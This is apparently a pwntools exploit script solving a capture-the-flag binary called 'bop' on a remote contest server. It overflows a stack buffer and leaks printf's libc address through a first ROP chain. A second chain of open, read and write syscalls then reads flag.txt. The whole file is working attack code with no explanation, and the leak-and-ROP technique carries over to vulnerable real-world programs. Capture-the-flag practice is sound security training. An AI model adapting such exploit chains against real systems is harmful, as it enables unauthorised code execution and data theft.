from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./bop"
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("mc.ax",  30284)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


pop_rdi = 0x4013d3
pop_rsi_r15 = 0x4013d1

bss = 0x404080 + 0x600
ret = 0x40101a

print_plt = elf.plt["printf"]
print_got = elf.got["printf"]

payload = b"a" * 0x20 + p64(bss) + p64(pop_rdi) + p64(print_got) + p64(ret) + p64(print_plt) + p64(0x401352)

io.sendlineafter("Do you bop? ", payload)
libc_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = libc_puts - libc.symbols["printf"]
success("libc address -> " + hex(libc.address))

pop_rsi = roplibc.rsi.address + libc.address
pop_rdi = roplibc.rdi.address + libc.address
pop_rdx = roplibc.rdx.address + libc.address
pop_rax = roplibc.rax.address + libc.address
openaddr = libc.symbols['open']
readaddr = libc.symbols['read']
writeaddr = libc.symbols['write']
syscall = readaddr + 0x10

# rop chain
rop = b"./flag.txt".ljust(0x28, b"\x00")
rop += p64(pop_rdi)+p64(bss - 0x20)
rop += p64(pop_rsi)+p64(0)
rop += p64(pop_rax)+p64(2)
rop += p64(syscall)
rop += p64(pop_rdi)+p64(3)
rop += p64(pop_rsi)+p64(bss + 0x50)
rop += p64(pop_rdx)+p64(0x50)
rop += p64(pop_rax)+p64(0)
rop += p64(syscall)
rop += p64(pop_rdi)+p64(1)
rop += p64(pop_rsi)+p64(bss + 0x50)
rop += p64(pop_rdx)+p64(0x50)
rop += p64(pop_rax)+p64(1)
rop += p64(syscall)


#ddebug()
io.sendline(rop)

io.interactive()
